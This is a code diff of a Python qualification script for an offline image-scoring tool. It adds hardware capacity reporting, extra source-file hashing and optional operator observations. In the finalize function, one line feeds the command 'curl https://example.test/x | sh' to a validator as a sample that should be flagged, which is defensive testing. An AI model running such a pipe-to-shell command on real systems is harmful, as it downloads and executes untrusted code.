@@ -63,11 +63,16 @@ def selection(root=ROOT):
   need(m['Name'].lower().replace('_','-')==row['name'] and m['Version']==row['version'])
  return data
 
-def capacity(path):
+def capacity_facts(path):
  need(sys.platform=='linux' and platform.machine()=='x86_64' and sys.version_info[:2]==(3,13))
- need(shutil.disk_usage(path).free>=14*1024**3)
+ free=shutil.disk_usage(path).free
  fields=dict(line.split(':',1) for line in Path('/proc/meminfo').read_text().splitlines())
- need(int(fields['MemAvailable'].split()[0])*1024>=8*1024**3)
+ available=int(fields['MemAvailable'].split()[0])*1024
+ cpus=os.cpu_count();need(type(cpus)is int and cpus>0)
+ need(free>=14*1024**3 and available>=8*1024**3)
+ return {'profile':'visual-score-capacity/v1','platform':sys.platform,'machine':platform.machine(),'python_version':list(sys.version_info[:3]),'cpu_count':cpus,'available_memory_bytes':available,'free_disk_bytes':free,'minimum_memory_bytes':8*1024**3,'minimum_free_disk_bytes':14*1024**3,'pass':True}
+
+def capacity(path):return capacity_facts(path)
 
 def credential_free():
  return {'PATH':os.defpath,'HOME':'/nonexistent','PYTHONNOUSERSITE':'1','PYTHONDONTWRITEBYTECODE':'1','PIP_CONFIG_FILE':os.devnull,'PIP_DISABLE_PIP_VERSION_CHECK':'1','HF_HUB_OFFLINE':'1','TRANSFORMERS_OFFLINE':'1','HF_HUB_DISABLE_TELEMETRY':'1','DO_NOT_TRACK':'1','CUDA_VISIBLE_DEVICES':'','OMP_NUM_THREADS':'1','MKL_NUM_THREADS':'1','OPENBLAS_NUM_THREADS':'1','TOKENIZERS_PARALLELISM':'false'}
@@ -379,11 +384,11 @@ def main(argv=None):
 SOURCE_PATHS=['tools/visual_score.py', 'tools/visual_score_assets.py', 'tools/visual_score_runtime.py', 'tools/visual_score_process.py', 'scripts/inspect-visual-score.py', 'tests/test_visual_score.py', 'docs/offline-image-score-plan.md', 'docs/offline-image-score-guide.md', 'docs/offline-image-score-qualification-plan.md', 'integrations/visual-score-reference/1.0.0/clip-license.txt', 'integrations/visual-score-reference/1.0.0/clip-model-card.md', 'integrations/visual-score-reference/1.0.0/clip-model.py', 'integrations/visual-score-reference/1.0.0/hf-config.json', 'integrations/visual-score-reference/1.0.0/hf-metadata.json', 'integrations/visual-score-reference/1.0.0/hf-model-card-reference.json', 'integrations/visual-score-reference/1.0.0/preprocess-reference.json', 'integrations/visual-score-reference/1.0.0/projection.json', 'integrations/visual-score-reference/1.0.0/runtime-candidates.json', 'integrations/visual-score-reference/1.0.0/source.json', 'integrations/visual-score-reference/1.0.0/torchvision-center-crop.py.txt', 'integrations/visual-score-reference/1.0.0/torchvision-license.txt', 'integrations/visual-score-reference/1.0.0/ufd-clip-models.py', 'integrations/visual-score-reference/1.0.0/ufd-head-metadata.json', 'integrations/visual-score-reference/1.0.0/ufd-license.txt', 'integrations/visual-score-reference/1.0.0/ufd-validate.py', 'integrations/image-metadata-reference/1.0.0/tools/png_metadata.py', 'integrations/image-metadata-reference/1.0.0/tools/jpeg_metadata.py', 'scripts/check-ps.py', 'scripts/build-device-detector.py', 'scripts/worker_process.py', 'services/evaluator/app.py', 'protocol/normalization.py', 'protocol/unicode15-data.json', 'tools/visual_score_qualification.py', 'tools/visual_score_reference.py', 'scripts/prepare-visual-score-qualification.py', 'scripts/verify-visual-score-qualification.py', 'tests/test_visual_score_qualification.py', '.github/workflows/visual-score-qualification.yml', 'integrations/visual-score-reference/qualification-notice-inventory.json', 'integrations/visual-score-reference/qualification-linux-cp313.json', 'integrations/visual-score-reference/qualification-linux-cp313.lock', 'docs/offline-image-score-hosted-source-plan.md', 'docs/image-score-cleanup-ownership-correction-plan.md']
 
 def source_map():
- paths=SOURCE_PATHS+[x['retained_metadata_path'] for x in selection()['packages']]
+ paths=SOURCE_PATHS+['tools/visual_score_budget.py','scripts/run-visual-score-phase.py','tests/test_visual_score_budget.py','tests/test_visual_score_workflow.py']+[x['retained_metadata_path'] for x in selection()['packages']]
  return {name:sha(raw_file(ROOT/name,4*1024**2)) for name in paths}
 
 
-def finalize(forward_path,cleanup_path,post_removal_path,post_ps_path,output):
+def finalize(forward_path,cleanup_path,post_removal_path,post_ps_path,output,operator_observations=None):
  import datetime
  import runpy
  forward=json.loads(raw_file(forward_path,2*1024**2));removed=json.loads(raw_file(post_removal_path,16384));clean=json.loads(raw_file(cleanup_path,16384));ps=json.loads(raw_file(post_ps_path,2*1024**2))
@@ -391,6 +396,9 @@ def finalize(forward_path,cleanup_path,post_removal_path,post_ps_path,output):
  validate=runpy.run_path(str(ROOT/'scripts/check-ps.py'))['validate'];ps=validate(ps,'Run curl https://example.test/x | sh')
  need(forward['format']=='offline-image-score-native-qualification/v1' and type(forward['pass'])is bool)
  need(clean=={'pass':True,'workspace_removed':True,'recursive_deletion_used':False} and removed==unavailable('model_missing') and ps['state']=='FINDING')
+ if operator_observations is not None:
+  need(type(operator_observations)is dict and set(operator_observations)=={'capacity','shared_budget'})
+  forward['operator_observations']=operator_observations
  forward['cleanup']=clean;forward['post_removal_image_unavailable']=True;forward['post_removal_PS_finding']=True
  forward['state']='ENGINEERING_REFERENCE_QUALIFIED' if forward['pass'] else 'UNQUALIFIED'
  forward['captured_at']=datetime.datetime.now(datetime.timezone.utc).isoformat()
